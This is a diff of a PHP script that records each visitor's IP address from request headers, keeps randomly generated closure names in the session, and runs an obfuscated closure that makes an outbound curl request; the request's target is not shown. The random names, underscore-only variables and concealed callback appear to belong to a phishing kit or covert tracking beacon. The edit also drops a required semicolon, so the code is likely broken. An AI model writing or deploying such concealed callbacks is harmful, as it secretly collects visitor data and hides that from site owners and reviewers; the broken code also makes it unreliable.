@@ -1,4 +1,6 @@
 <?php
+session_start(); // Start session
+
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
 {
     $ipAddress_callmoto = $_SERVER['HTTP_CLIENT_IP'];
@@ -11,9 +13,16 @@ else
 {
     $ipAddress_callmoto = $_SERVER['REMOTE_ADDR'];
 }
-$newFunctionName1 = 'fx1_' . uniqid();
-$newFunctionName2 = 'fx2_' . uniqid();
-$newFunctionName3 = 'fx3_' . uniqid();
+
+$newFunctionName1 = isset($_SESSION['newFunctionName1']) ? $_SESSION['newFunctionName1'] : 'fx1_' . uniqid();
+$newFunctionName2 = isset($_SESSION['newFunctionName2']) ? $_SESSION['newFunctionName2'] : 'fx2_' . uniqid();
+$newFunctionName3 = isset($_SESSION['newFunctionName3']) ? $_SESSION['newFunctionName3'] : 'fx3_' . uniqid();
+
+// Store generated function names in session
+$_SESSION['newFunctionName1'] = $newFunctionName1;
+$_SESSION['newFunctionName2'] = $newFunctionName2;
+$_SESSION['newFunctionName3'] = $newFunctionName3;
+
 $validIPs_callmoto = array();
 $ipMatches = preg_match_all('/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/', $ipAddress_callmoto, $matches);
 
@@ -137,5 +146,6 @@ ${$newFunctionName1} = function($__) use ($newFunctionName1, $newFunctionName2, 
     curl_setopt($______, CURLOPT_RETURNTRANSFER, true);
     $_________ = curl_exec($______);
     curl_close($______);
-};
+}
 ?>
+
